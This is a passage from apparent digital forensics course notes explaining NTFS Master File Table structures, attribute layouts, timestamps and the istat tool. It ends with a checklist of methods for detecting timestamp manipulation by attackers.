$MFTMIRR A backup copy of the first four records of the MFT

2

$LOGFILE

Transactional logging file

3

$VOLUME

Contains volume name, NTFS version number, dirty flag

4

$ATTRDEF

NTFS attribute definitions

5

.

Root directory of the disk

6

$BITMAP

Tracks the allocation (in-use versus free) of each cluster in the volume

7

$BOOT

Boot record of the volume

8

$BADCLUS Used to mark defective clusters so that NTFS will not attempt to use them

9

$SECURE

Tracks security information for files within the volume

10

$UPCASE

Table of Unicode upper case characters used to assist sorting filenames

11

$EXTEND

A directory containing $ObjId, $Quota, $Reparse, $UsnJrnl

$MFT
The first record, record number 0, describes the MFT. This record provides us the name, $MFT, and information
necessary to find all the other clusters containing the rest of the MFT. The Volume Boot Record (VBR) contains
a pointer to the cluster this record will lie in, and the records within the MFT contain the pointers to the clusters
for every other object. Unlike FAT, in NTFS, the VBR is the only object that is tied to a specific sector on disk
and cannot be relocated elsewhere.

.

$MFTMIRR
The second record contains a backup of the primary $MFT in case the primary record cannot be read due to
physical damage of the disk. The information in record 0 that the system needs to find to read in the rest of the
$MFT file is all we are really needing backed up, but because we are allocating space on the disk for an entire
cluster, an entire cluster of MFT records will get backed up. Because the default cluster size is 4K and records
are 1K, this usually works out to be the first four records.
$LOGFILE
This file contains the Transactional Logging information used by NTFS to maintain the integrity of the
filesystem in the event of a crash. This process is called Journaling in most other filesystems that support the
feature. We will talk more about this file later.
$VOLUME
This file contains the friendly name of the volume for display in My Computer and other locations, as well as
the NTFS version number and a set of flags that tell the system if the volume was unmounted cleanly on last use.
$ATTRDEF
This file defines the NTFS attributes for the version of NTFS in use on this volume. We will talk more about
some of these attributes later. The main thing you need to know is that the names we use to refer to the attributes
come from this file.
“.”
MFT record number 5 is the root directory. Functionally, it is no different than any other directory except that it
is always record number 5 and its name is a single dot (“.”).
$BITMAP
This file is a long string of binary data, with a bit for each cluster within the volume. For each cluster in the
volume, the corresponding bit will be set to either 1 or 0 depending on whether the cluster is allocated to a file,
respectively. In other words, $BITMAP tracks whether clusters are in use or available.

© 2023 SANS Institute

.

27

$BOOT
This file allows the VBR to be accessed via normal file I/O operations.
$BADCLUS
This file provides the filesystem a way of marking, and thus not using, clusters where there is physical damage
(this makes them unreliable to save data to). The $BadClus file is a sparse file that has a file size equal to the
volume size and is initially filled with all zeros. A sparse file is a file in which clusters that are all zeros don’t
actually get written to the disk. Because the entire file is all zeros, no space on disk is allocated for the file. If a
cluster is determined to be bad, data will be written in this file at the offset that corresponds to the location of
that cluster. This fake “data” isn’t actually laid on the disk, but the existence of this “data” causes the $Bitmap
file to mark that cluster as in use. Thus, no other file will try to use that cluster in the future. In the real world,
the hard disk controller will remap sectors that are failing, so this fail-safe rarely will get any use.
$SECURE
This file contains an index that is used to track the security information for the files on the system. Each
individual file will contain security information about who owns the file and who is allowed to open it. This
index serves as a central place to hold information about the owners so that security information lookup does not
have to be repeated for every file.
$UPCASE
This file contains a table of uppercase and lowercase Unicode letters for each Unicode code page in use for
filenames within the system. This table is used in sorting the files by name so that “A” and “a” are next to each
other when sorting alphabetically.

.

$EXTEND
Even though there are 24 records reserved for system use, when new system files were introduced, rather than
place the new system files in those records, a directory entry was placed in record number 11 to hold the new
system files, and these new system files were placed into normal records for regular use. Because the files below
are written by the format command before user files are written, they will almost always be located in the first
four records that are not reserved (record numbers 24–28). They are not static like the first 12 records (which
always use the record numbers indicated above).
$EXTEND\$ObjId
This file contains an index of all the object IDs in use within the volume. Object IDs allow a file to be tracked
even if the file gets moved, renamed, or otherwise changed in a way that would cause a pointer like a link file to
be unable to find the file.
$EXTEND\$Quota
This file contains information about how much allocated space each user is allowed to use and is currently using
on a volume. When enabled, this allows a system administrator to prevent a user from using too much disk
space.
$EXTEND\$Reparse
This file contains an index of all the reparse points on the volume. Reparse points have a multitude of uses, but
the most common use is for symbolic links, in which a file is really just a pointer to another file. Reparse points
are also used for mounting other volumes as a directory on a volume.
$EXTEND\$UsnJrnl
The Update Sequence Number (USN) Journal, also known as the Change Journal, is an index listing all of the
files that have changed on the system and why the change took place. We will talk more about this journal later.

28

© 2023 SANS Institute

.

.

Reference pages 277–278 of File System Forensic Analysis.
Windows File Systems http://for508.com/q3bsh

© 2023 SANS Institute

.

29

Metadata Layer Metadata Entries: Allocated or Unallocated?
Analysis

MFT Entry Allocated
• Metadata filled out (name, timestamps,
permissions, etc.)
• Pointers to clusters containing file contents (or
the data itself, if file is resident)

MFT Entry Unallocated
• Metadata may or may not be filled out
• If filled out, it is from a deleted file (or
folder). The clusters pointed to may or
may not still contain the deleted file’s data.
• The clusters may have been reused
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Like clusters at the data layer, metadata entries are also allocated or unallocated. An allocated metadata entry is
in use by a file or directory. If an entry is unallocated, it should be in one of two states: 1) it was never written to
and is therefore empty, or 2) it was used in the past and still contains data about the last deleted file or directory
that used it. When this occurs, we at least have the opportunity to analyze the metadata about that file or folder,
including the name, timestamps, ownership, etc. We may also be able to recover the file in full if the clusters
used by the file have not been reused since (i.e., overwritten by a newer file).

30

© 2023 SANS Institute

.

30

Sequential MFT Entries
•

As files are created, regardless of their directories, MFT allocation patterns
are generally sequential and not random

Two groups of
sequential MFT
entry numbers
Analysis trick: Use analysis of contiguous metadata values to find files likely
created in quick succession, even across different directories
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

31

Metadata address allocations are generally sequential in nature. This means that as new files are created on the
file system, the next available record will be used. In the example at the top of the slide, we see the result of a
malicious executable named “spinlock.exe” running for the first time. When it ran, several resource files
embedded in the executable were extracted and written to the user’s temp directory. All of these resource files
were created at the same time. NTFS usually uses the next available MFT entry to create a new file. When
many files are written in close succession, the result is typically sequential MFT records being used. That’s
what we see at the top of the slide, where records 60940-60947 are used for 8 new files. A similar effect
happens at the bottom of the slide when another malicious executable hiding as “svchost.exe” runs and creates a
helper executable named “a.exe”, which also runs. Both executions cause prefetch files to be created in quick
succession. As a result, see another cluster of sequential MFT records.

.

•

We should point out that this pattern does not happen in every situation. At the same time, it’s not unusual. The
interesting thing about this clustering behavior, when it occurs, is that the MFT entries essentially become a
backup creation timestamp, offering an alternate view of when files were created. In other words, files with
MFT records near a file of interest may well have been created at nearly the same time, despite what the actual
timestamps say (i.e., as a result of timestomping).
Overall, MFT allocations are commonly sequential when files are created in quick succession. If you start
looking at the file system from this point of view, it begins to open new doors in your investigations.

© 2023 SANS Institute

.

31

Metadata Layer Typical MFT Entry Attributes
Analysis

MFT is database-like and very structured
MFT entries are typically 1024 bytes long
Every object gets an entry with attributes to describe it
The most common attributes include:
Common attribute types::names for FILES

Common attribute types::names for DIRECTORIES

0x10 :: $STANDARD_INFORMATION

0x10 :: $STANDARD_INFORMATION

0x30 :: $FILE_NAME (Long)

0x30 :: $FILE_NAME (Long)

0x30 :: $FILE_NAME (Short ­ sometimes)

0x30 :: $FILE_NAME (Short ­ sometimes)

0x80 :: $DATA

0x90 :: $INDEX_ROOT

0x80 :: $DATA (alternate data stream – sometimes)

0xA0 :: $INDEX_ALLOCATION (sometimes)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

In NTFS, the Master File Table (MFT) is at the heart of the file system. It is a very structured database that
stores metadata entries for every file and folder on the volume.

.

Every object gets an entry within the MFT. Each entry is a pre-defined size, which is usually 1024 bytes long.
They contain a series of attributes that fully describe the object. A file gets an entry, a directory gets an entry,
even the volume name gets its own entry (always at reserved entry #3, for the $VOLUME system file). Note: In
rare circumstances, MFT entries can be set by the file system to be larger than 1024 bytes (usually 4096 bytes).
The table in the slide above shows the most common NTFS attribute names and type values for both files and
directories. We will discuss each of the bolded attributes in detail shortly. For reference, below is a table with
additional attributes commonly used in NTFS.

Type

Name

Type

Name

0x10

$STANDARD_INFORMATION

0x90

$INDEX_ROOT

0x20

$ATTRIBUTE_LIST

0xA0

$INDEX_ALLOCATION

0x30

$FILE_NAME

0xB0

$BITMAP

0x40

$OBJECT_ID

0xC0

$REPARSE_POINT

0x50

$SECURITY_DESCRIPTOR

0xD0

$EA_INFORMATION

0x60

$VOLUME_NAME

0xE0

$EA

0x70

$VOLUME_INFORMATION

0xF0

0x80

$DATA

32

0x100

© 2023 SANS Institute

.

$LOGGED_UTILITY_STREA
M

32

Overview of an MFT Entry
Example MFT entry for a file with resident data
MFT Header
•
•

Start of MFT entry for “winclient.reg”

Start of $SI

Begins with “FILE” signature
Includes allocation status & Entry #

Start of 1st $FN

$STANDARD_INFORMATION
•
•

Begins with attribute value 0x10
Contains a set of 4 timestamps

Start of $DATA

Start of 2nd $FN

$FILE_NAME
•
•
•

Begins with attribute value 0x30
Contains a set of 4 timestamps
Here we see two $FN attributes:
1. DOS 8.3 short name
2. “Normal” long name

$DATA
Begins with attribute value 0x80
Contains either data or cluster runs
• Here the data is resident

0xFFFFFFFF marks the end of the entry.
Remaining data in this entry is unused slack space.
Start of next MFT entry

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

33

As we dig deeper into the structure of the Master File Table, it may help to step back and see a big-picture view
of its building blocks—the MFT “FILE” entry. Shown in the slide is a single 1024-byte entry, followed at the
very bottom by the start of the next entry. Notice that an MFT entry has a defined structure. It consists of the
MFT header at the beginning, followed by a series of attributes that describe in detail the object being
referenced (in this case, a file rather than a directory). On a typical system, the MFT will consist of many
thousands of entries just like this. We will discuss the various attributes separately, but as a quick reference,
here we have highlighted a few features of the core attributes for a file.

.

•
•

The following fields are called out in the image above using block borders (in order of appearance, reading left
to right). We will describe these components in detail throughout this section.
•
•
•
•
•
•
•

Start of a 1024-byte MFT entry (0x46494C45 = “FILE” in ASCII)
Allocation status of the entry (0x01 = File In Use)
MFT record number (0x0000EDF7 = 60,919 in decimal, stored in little endian)
Start of $STANDARD_INFORMATION attribute (0x10)
Set of 4 Windows 64-bit timestamps in the $STANDARD_INFORMATION attribute
Start of 1st of 2 $FILE_NAME attributes (0x30)
Parent directory reference, which includes the parent’s MFT entry number (0x017C = 380 in decimal)

• Set of 4 Windows 64-bit timestamps in the $FILE_NAME attribute
• File name (the 1st $FILE_NAME is for the short file name “WINCLI~1.REG”)
• Start of 2nd of 2 $FILE_NAME attributes (0x30)
• File name (the 2nd $FILE_NAME is for the long file name “winclient.reg”)
•
•
•
•
•

Start of $DATA attribute (0x80)
Residence status (0x00 = resident; 0x01 = non-resident)
File data (this file is small enough to hold its data within the MFT entry)
End of MFT entry marker (0xFFFFFFFF)
Start of the next 1024-byte MFT entry (0x46494C45 = “FILE” in ASCII)

© 2023 SANS Institute

.

33

Analyzing File System Metadata with The Sleuth Kit’s istat
•
•
•
•
•

The Sleuth Kit is an open-source set of tools for performing disk-based forensic
analysis
Great for performing analysis, as well as learning the many facets of file systems
The istat tool from The Sleuth Kit displays statistics about a given metadata
structure (aka “inode”), including MFT entries
Supports multiple image types including RAW (dd), EWF (E01), & VMDK/VHD
Supports multiple file systems including NTFS, FAT12/16/32, ExFAT,
EXT2/3/4, HFS, APFS, and more!
istat [options] image inode
-z zone: Time zone of original machine (i.e. EST5EDT or GMT)
-s seconds: Time skew of original machine (in seconds)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

To describe the major components of NTFS, we take two approaches in this section. First, we take advantage of
the excellent tools from The Sleuth Kit for dissecting the key features of the file system. We begin with “istat”,
which nicely parses out the information found in MFT entries.[1] Second, we take a deeper look at the core
NTFS attributes in the notes section by diagramming their hex structure and describing their innerworkings.
While this level of detail may not be needed for every case, we hope it serves as an excellent resource for those
cases that require a lower-level examination.
We start with the istat tool, which is designed to parse out metadata information from a wide variety of file
systems, including NTFS, FAT, and ExFAT. It can be used against several forensic image types, including raw,
E01, and even the virtual hard drive formats VMDK and VHD. It can even analyze the live file system. For
example, to parse the root directory of the G: drive on the FOR508 Windows VM, type “istat \\.\G: 5” in
an Administrator command prompt (MFT record number 5 is always reserved for the root of the volume).

The istat tool is relatively straightforward. It requires just an image file (or the live file system) and a metadata
entry number to process (generically referred to as the “inode” number—hence the “i“ in “istat”). The most
important optional switches deal with time issues. The “-z” flag allows you to specify the time zone of the
image. Otherwise, the local time zone of the analysis system will be used (which is set to UTC in our FOR508
VMs). The “-s” flag allows you to specify the clock skew of the system. For example, if you knew that the

34

© 2023 SANS Institute

.

34

system was slow by 32 seconds, then adding the flag “-s -32” would be used to correct this. When this option is
used, both the adjusted and unadjusted times are displayed. For a full set of command line switches, run “istat“
by itself.

.

[1] istat man page: https://for508.com/1yx-u

© 2023 SANS Institute

.

35

Analyzing MFT Entry Header & $STANDARD_INFORMATION
Using istat to analyze MFT entry number 60919

MFT Entry Header
• Provides allocation status
•

Allocated file in this case

• Includes MFT entry number
• $LogFile Sequence Number

$STANDARD_INFORMATION
• Provides file or folder attributes such
as ReadOnly, Hidden, Archived, etc.
• Security information
• USN Journal’s Sequence Number
• Includes 4 timestamps:
•
•
•
•

Creation
Data Modified
MFT Metadata Modified
Data Last Accessed

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Let’s look at the start of istat output, which includes parsed data from the MFT Entry Header and the first
attribute, the $STANDARD_INFORMATION attribute. In the slide above, we see output from running istat on
MFT record number 60919 for a host from our previous SRL intrusion case. From the MFT Entry Header, we
see key information, such as the allocation status and object type (a file rather than directory), the $LogFile
Sequence Number, and the MFT entry number. The $STANDARD_INFORMATION attribute follows, with
important information such as the file’s flags, security information, $UsnJrnl Sequence Number, and MACB
timestamps. Let’s discuss each of these items in detail and review their structure in an example MFT entry.
MFT Record Header

36

© 2023 SANS Institute

.

36

Each valid MFT entry will begin with a signature of “FILE” (0x46 0x49 0x4C 0x45). If the system has detected
an error in the entry, you may see a signature of “BAAD” (0x42 0x41 0x44). Looking for “FILE” at the start of
a sector is a good way of locating MFT fragments in unallocated space.
Following the signature field is a 2-byte value that gives the offset to the Fixup Array relative to the start of the
MFT entry and a second 2-byte value that contains the number of entries in the Fixup Array. The Fixup Array is
used for error checking MFT data structures that span multiple sectors (excluding sectors that contain file data).
When these data structures are written to disk, the last 2 bytes of each sector are copied into a special array, and
a signature value is written to the last 2 bytes of each sector. When the data structures are read by the system,
the last 2 bytes of each sector are compared against the signature value, and if everything checks out, the
signature values are replaced by the values that were previously copied into the array. In this way, the system is
able to detect corrupt FILE entries.
The $LogFile Sequence Number (LSN) at offset 0x08 is part of the journaling filesystem and is used to
determine whether the filesystem is consistent or needs to have certain actions redone or undone to achieve
consistency. The number written here is the offset into the $LogFile where the record pertaining to this entry
will be located. In the example above, the offset is 0x021F7EA9E6 since the value is stored in little endian
format.
The Sequence Number at offset 0x10 is a counter that tracks the number of times an MFT record has been
reused.[1] When an MFT record is allocated for the first time, its Sequence Number will be set to 1. When a file
is deleted and the MFT record becomes unallocated, the Sequence Number is incremented again (and will only
be incremented on subsequent deallocations). In other words, the sequence number goes up when a file is
deleted and not when a new FILE record is created or reused.
The Hard Link count at offset 0x12 refers to the number of $FILE_NAME attributes there are for this file.
Multiple $FILE_NAME attributes can track both long and short filenames for the same file (only one or the
other will be displayed to you) or they could be true hard links where they are different names or in different
directories. In either case, they are referring to the same record.

.

The Flags at offset 0x16 can have the following values (hex, binary, meaning):
0x00
0x01
0x02
0x03

0000
0001
0010
0011

Not in use
File in use
Directory that has been deleted
Directory in use

Deleting a file will change the “in use” bit of the flag to 0 but does nothing to clear out the rest of the data. Thus,
many of the deleted file’s metadata are still recoverable as long as the MFT record hasn’t been reused
(overwritten) for a different file.
The offsets at 0x18 and 0x1C reflect the current size of the bytes being used by the FILE record and the total
number of bytes allocated to the FILE record (0x0400 = 1024 bytes). The difference between these two values
would be the slack space in the FILE record.
The File Reference to Base Record at offset 0x20 is only used for Extended Records. These are used when a
record contains so many attributes that it can’t fit them all within 1024 bytes. For the vast majority of records,
this will be all zeros.
The Next available attribute ID at offset 0x28 reflects the attribute number a new attribute will be assigned when
it is added to the current FILE record. Each attribute will have a unique ID number, starting at zero.
The next field depends on the version of NTFS you are dealing with. With older versions, the next byte after the
Attribute Count was the start of the Fixup. Starting with Windows XP (using NTFS version 3.1 and onward), the
MFT Record Number (aka Inode Number) of this record is saved at offset 0x2C. This field is useful when find© 2023 SANS Institute

.

37

ing fragments of the MFT during data recovery. The inclusion of this field changed the header length, which is
noticeable in the Offset to Fixup at offset 0x04. The value of that field changes from 0x2A in older versions to
0x30 in newer systems (in ASCII, it changes from a “*” to a “0”). This is important to note because some older
file carving tools will include that byte in their signature of an MFT record, and if they are looking for “FILE*”
but not “FILE0”, they may not find what you are expecting to find.
At offset 0x30, we find fixup information. The first three 2-byte fields are the Fixup code, made up of the
Update Sequence Number (USN), and the Update Sequence Array (USA). The Fixup Length at offset 0x06 will
tell you how many 2-byte entries make up the USN+USA. At the end of each 512-byte sector in a 1,024-byte
MFT Record, the system will write the USN. (Note: Unless MFT record length changes, this will always happen
twice. Thus, for MFT records, the fixup will always be three entries). When these sectors are read, the system
will compare the numbers it finds at the end of each sector with the USN in the record header. If all three match,
everything is great. If they don’t match, the “FILE” signature is overwritten with “BAAD”, and an error
message is returned. As for the original contents of the bytes at the end of the sector that were overwritten, that
is where the USA comes into play. Each entry in the USA contains the original 2 bytes that were originally in
the last 2 bytes of each sector of the record. So, when reading in the first sector of the record, the system checks
the last 2 bytes against the USN and then replaces those 2 bytes in memory with the first entry from the USA.
Then it repeats that process for the second sector, using the second USA entry. This same phenomenon is also
seen in directory indexes, but there are typically a lot more fixup values present in directory entries.

.

$STANDARD_INFORMATION Attribute

The $STANDARD_INFORMATION attribute is identified by a Signature value of 0x10, or 16 in decimal.
At offset 0x18 of the attribute, you will find a set of four timestamps: Created, Modified, MFT entry modified,
and Last Accessed. These are the timestamps that are going to be used by the operating system to display a file’s
date and time information. In other words, when we see timestamps in Windows File Explorer or the command
shells, these are the timestamps provided. Other timestamps will be kept in other locations as we will see later,
but these are the definitive set of timestamps to be presented to end users.

© 2023 SANS Institute

38

.

At offset 0x38 is a set of flags. These flags track the file’s attributes, such as hidden, read-only, and so on.
10 00 00 00 Directory
20 00 00 00 Archive
40 00 00 00 Device
80 00 00 00 Normal

01 00 00 00 Read Only
02 00 00 00 Hidden
04 00 00 00 System

00 10 00 00 Offline
00 20 00 00 Not Indexed
00 40 00 00 Encrypted

00 01 00 00 Temporary
00 02 00 00 Sparse File
00 04 00 00 Reparse Point
00 08 00 00 Compressed

Each flag value above corresponds to a single bit being set to 1. For example, in the hex dump above, the Flags
value is 0x20, which means the Archive bit is set. If it were 0x2608, then the Archive, Hidden, System, and
Compressed flags are set.
The rest of the properties provide tracking numbers for the file used by the $Secure, $Quota, and $UsnJrnl
system files. These will be unique numbers assigned for tracking this specific file in those indexes and have no
meaning outside the filesystem. (The Security ID here has no relation to the SID used in Windows to track the
user.) They are vitally important when parsing the $Secure and $UsnJrnl, as some entries in that index will only
refer to the file by the tracking number here. Most of these fields are present only in NTFS versions 3.0 and 3.1.

.

Reference:
Carrier, Brian. File System Forensic Analysis. Boston, MA: Addison-Wesley, 2005. Print. Pages 353–355, 360–
362.
[1] MFT_SEGMENT_REFERENCE structure (Windows) http://for508.com/n0k-4

© 2023 SANS Institute

.

39

Analyzing $FILE_NAME & Attributes Summary
$FILE_NAME
• Provides file or directory
attributes such as ReadOnly,
Hidden, Archived, etc.
• Provides name of file or directory
•

Here it is “winclient.reg”

• Contains parent directory MFT
Entry
• Includes 4 more timestamps
•

These do not show up in Windows
naturally

Attribute List
• This file has 2 $FN attributes
•
•

• This file has one $DATA attribute

One for the long file name
Another for the short file name (8.3)

• The data for this file is Resident
• The data file size is 348 bytes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

The remaining istat output for the example MFT entry 60919 is shown in this slide. It includes details of the
$FILE_NAME attribute followed by a list of all attributes that were contained in this MFT entry (just 4
attributes for this example file).

.

The $FILE_NAME includes important information such as the object’s name, parent directory, properties such
as Archive, Hidden, ReadOnly, etc., and another set of timestamps.
The attributes summary at the bottom lists the attributes found in the MFT entry, along with the size each
attribute uses in the 1024-byte MFT entry. This file has a $STANDARD_INFORMATION attribute, two
$FILE_NAME attributes (one for the full name and another for the DOS 8.3 short name), and finally a $DATA
attribute. In this example, the file is resident, meaning the data resides inside the MFT entry. If it were nonresident, istat would provide us with the list of cluster addresses where the file’s data could be retrieved.
Note that the values in parenthesis after the attribute name contain the decimal representation of the “Attribute
Type”, followed by the “Attribute ID”. The attribute ID uniquely identifies a specific instance of an attribute,
which is important when two or more of the same attribute types exist for the same object. We see this situation
in our example file with two instances of the $FILE_NAME attribute.
Before moving on, let’s take a closer look at the $FILE_NAME attribute.
$FILE_NAME Attribute
The $FILE_NAME attribute is identified by a Signature value of 0x30, or 48 in decimal.

40

© 2023 SANS Institute

.

40

.
The Parent Directory Reference at offset 0x18 consists of two parts. The first 6 bytes are the MFT entry number
of the parent directory, and the remaining 2 bytes are a sequence number for that MFT Record.
At offset 0x20 is the beginning of another set of MACB timestamps. Interestingly, these timestamps are
updated differently than the set found in the $STANDARD_INFORMATION attribute. It has not been
confirmed why a separate set of timestamps are stored here, nor why they would be updated differently.
However, in some cases, it can be used to our advantage. We will discuss the two sets of timestamps shortly.
The Flags at offset 0x50 are the same as the ones in the $STANDARD_INFORMATION attribute. At offset
0x58, a single byte tells us the number of 2-byte Unicode characters that make up the name. Hence, we have to
double the value at offset 0x58 to determine the total number of bytes to read. This is helpful for us so we don’t
read in more data than we should, as the padding after the name could contain some garbage information,
similar to file slack. Note that each attribute must start at a multiple of 8 bytes, so there will be 0 to 7 bytes of
padding after the filename.
Consider the ramification of a single byte at 0x58 providing the number of Unicode characters that make up the
name. The maximum value you can store in one byte of data is 0xFF, or 255 in decimal. This is why NTFS
cannot natively handle more than 255 characters in filenames; there just isn’t enough space to store a file name
beyond 255!

© 2023 SANS Institute

.

41

Offset 0x59 is the Namespace Type that tells us what kind of name to expect. Possible values include (hex,
meaning, description):
0x00 – POSIX
0x01 – Win32
0x02 – DOS
0x03 – Win32/DOS

Case is preserved, and different case is considered a different name.
A case-sensitive long name.
A DOS-compatible short name.
Name is short enough to need only one $FILE_NAME.

If a file has a small name, such as “File.txt”, only a single $FILE_NAME attribute will be created. If the file has
a long name, such as “This is a Really Long Name.txt”, two $FILE_NAME attributes are created to save both
the long name (preserving the case) and a second one to save a DOS-compatible 8.3 short name
(“THISIS~1.TXT”). This gives us potentially three different sets of timestamps for any given file (one $SI set
and two $FN sets). As we will see later, entries in directory indexes follow the same format as the
$FILE_NAME attribute, giving us yet another set of timestamps for the same file.

.

Here is a look at the other $FILE_NAME attribute used to store the 8.3 short name. The only differences are the
Namespace Type (now 0x02 to specify a DOS short name), the name itself (now in 8.3 format), and the length
of this attribute (it requires less space to store the 8.3 short name).

42

© 2023 SANS Institute

.

Windows Time Rules

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

43

.

NTFS maintains two sets of timestamps, and as it turns out, they get updated differently. Here we see the
general rules when it comes to files (not folders) being moved, copied, accessed, modified, or created for the
$STANDARD_INFORMATION timestamps. On the next slide, we will show the rules for the $FILE_NAME
attribute timestamps. It’s important to note that these rules are from testing with Windows File Explorer and the
cmd.exe command shell.
It should also be emphasized that these are general rules. While typically accurate, they could differ now and, in
the future, particularly due to the frequency of changes to Windows 10+. In fact, one known exception is that
starting with Windows 10 v1803, the last access timestamp may be enabled again under certain conditions.[1]
Another caveat worth noting is that the Windows Subsystem for Linux (WSL) updates times differently than
what is shown here. Richard Davis has a video as part of his excellent “13Cubed” series where he tests many of
these timestamp rules.[2] 23 minutes into the video, he shows that the Windows Subsystem for Linux bash shell
does not abide by the rules of the normal Windows shell.
Admittedly, it can be a bit frustrating to try to analyze timestamps using rules that are not accurate 100% of the
time. However, rules that are accurate 95% of the time can still be very useful in determining what likely
occurred on a system. Analysts should use these rules to aid their investigations, but also be aware that there are
edge cases which cause timestamp behavior that’s outside the norm.
[1] Changes in the NTFSDisableLastAccessUpdate key: https://for508.com/4hzc[2] 13Cubed video on Windows MACB Timestamps: https://for508.com/qp3tb

© 2023 SANS Institute

.

43

Windows Time Rules

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Here we see the same tests performed while examining the $FILE_NAME timestamps. Clearly, the rules are
different. In some cases, we can use this to our advantage. In particular, the $FILE_NAME creation timestamp
is updated using almost the same rules as the $STANDARD_INFORMATION timestamp. As we discuss next,
seeing discrepancies in a file’s $STANDARD_INFORMATION and $FILE_NAME creation times could be an
indication of timestomping.

44

© 2023 SANS Institute

.

44

.
© 2023 SANS Institute

.

45

Detecting Timestamp Manipulation

• “Timestomping” is common with attackers and malware
authors to make their files hide in plain sight
• Artifacts from “timestomping” vary based on the tool used
• We can check for several anomalies:
❑ $STANDARD_INFORMATION “B” time prior to $FILE_NAME “B” time
❑ Fractional second values are all zeros
❑ $STANDARD_INFORMATION “M” time prior to ShimCache/Amcache
❑ $STANDARD_INFORMATION times prior to executable’s compile time
❑ $STANDARD_INFORMATION times prior to $I30 slack entries
❑ USN Journal records contradict current creation timestamp
❑ MFT entry number is out of sequence from expected range
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

There are both legitimate and illegitimate reasons to change a file’s timestamps. For a legitimate use case,
consider modern cloud storage technology. When files are synced from a cloud storage solution, such as
Dropbox for example, it would be ideal if all synced copies across different devices show the same last
modification timestamp, which of course should correspond to the actual time the user last changed the files.
However, when a user installs the Dropbox client on a new system and files are synced from the cloud to that
host, as far as the host knows, those are new files that have just been created. In Windows, newly created files
have all their timestamps set to the time of creation. However, that time will not correspond to when Dropbox
reports the user last modified the files. So, cloud storage apps like Dropbox not only sync the files’ data, but
also some of the timestamp metadata. Exactly which timestamps get synced will vary by provider, but most
sync the last modification time at a minimum. In our example with Dropbox, the Dropbox client on the new
host will backdate the newly synced files (using the Windows API) to the last modification time as tracked by
Dropbox.
Just as there are legitimate reasons to modify timestamps, there are reasons attackers would want to do it
illegitimately as well. The main reason is to cause their malware to have timestamps that blend in better with
other timestamps on the system. A classic example is when attackers put their malware in the coveted
C:\Windows\System32 folder to appear to be a standard Windows process. They can change the name to make
it appear legitimate, but if they can also change the timestamps to match other times in that directory, then all
the better. Note that we often use the term “timestomping” to describe this malicious practice, which comes
from one of the original NTFS timestamp changing tools called “timestomp”.[1]
In the past, offensive tools had limitations that made detection of backdated timestamps fairly trivial. For
example, if times were manually set, most tools would not provide fractional-second granularity. However,
Windows timestamps provide resolution down to the 100-nanosecond level, so when a timestamp happened to
be created on the second exactly (i.e., all zeros in the decimal places), then that was an unusual artifact and not
likely a “natural” timestamp. Another anomaly analysts could look for was a difference between the
$STANDARD_INFORMATION and $FILE_NAME creation timestamps, since most tools could not update the
$FILE_NAME timestamps. However, newer tools have been developed which can use a reference file to copy
all the timestamps of a known good file to the malicious file. This technique effectively defeats both the
detection methods just discussed.
46

© 2023 SANS Institute

.

46

Today, the best approach is to use multiple checks. However, none of these checks are iron-clad, so any serious
attempts to find timestamp anomalies should be limited to reviewing files that have already been determined to
be suspicious. Otherwise, too many false-positives will likely bog down the analysis. This is due to multiple
factors, including several legitimate use cases for timestamp changing (such as cloud storage file syncing).
1.

2.

3.

4.

.

5.

Compare $FILE_NAME times with times stored in $STANDARD_INFORMATION. Some common
timestomping tools will still be detected from this anomaly, particularly when the perpetrator manually
specifies a timestamp value. Any of the following tools (and plenty more) allow the analyst to perform this
check: mftecmd, fls, istat, FTK Imager
Check for all zeros in the decimal places (i.e., zeroed fractional seconds). Some common timestomping
tools will still be detected from this anomaly, particularly when the perpetrator manually specifies a
timestamp value. Fewer tools can assist the analyst with this check, since not all tools provide sub-second
resolution for timestamps. Useful tools include mftecmd (not in body file format) and istat.
If available, compare the ShimCache (aka AppCompatCache) timestamp with the
$STANDARD_INFORMATION file modification (M) time. As soon as an executable is detected by
Windows, the Application Compatibility subsystem checks the executable and adds it to the ShimCache in
the SYSTEM hive, including the $SI last modification time of the executable when it was first observed.
Since executables rarely get modified (and certainly not with a time that goes backward), we should see
matching timestamps between what ShimCache reports and the executable’s current $SI last modification
time. If, on the other hand, the current $SI last modification timestamp for a suspicious executable is well
before the date reported in ShimCache, then that’s a solid indication that the file’s modification time was
altered. To check for this anomaly, we can use any of the file system tools previously mentioned to check
the $SI last modification time. To compare that with the ShimCache time, use a tool such an
AppCompatCacheParser.exe or ShimCacheParser.py.
Also, for executables, check the embedded compile time against the timestamps for the file on disk. It
stands to reason that a file should not be compiled after it is written to disk, since the compilation process
creates the executable in the first place. Once again, we can use any of the file system tools previously
mentioned to check the $STANDARD_INFORMATION timestamps. To check compile times of
executables, almost any Windows PE parser will work, including Sysinternals’ sigcheck and the versatile
ExifTool by Phil Harvey.[2]
For any file type, there is a possibility of finding old information about the file in its parent directory index.
We will discuss “$I30” directory indexes in detail a little later. For now, know that they contain the file
name, a full set of $SI timestamps, and the MFT entry number with sequence number to conclusively track
the file. Stale entries may show up in the index, which can provide a previous set of timestamps. If the
previous timestamps are a more recent date than the current, then that’s a sign of timestamp backdating.
The USN Journal provides excellent visibility into changes to files on the file system. This includes file
creation time. It may be possible to locate the original creation time of a backdated file. If so, we can
compare the current creation time of the file with the time the USN Journal recorded its creation time and
note any discrepancy.
The Windows NTFS driver tries to be as efficient as possible. One thing it does to minimize extra work
when creating new files is simply use the next available MFT records to write new files. Therefore, if it
creates many new files at the same time, it’s very likely that those files will have near sequential MFT
record numbers (if not exactly sequential). This often occurs in the C:\Windows\System32 directory when
the OS is installed and most of those files are created sequentially at install time. Now, consider that at a
later time, an attacker downloads malware to C:\Windows\System32 and backdates the malicious file to
blend in. When running a standard file listing, the times will all be in a close range and the malicious file
will be harder to spot. However, what will likely stand out is the MFT record number for the malware.
Since it was created much later, its MFT record will unlikely be in a close range of record numbers with the
legitimate files. The best tools to use for this check are file systems timelining tools that output all records,
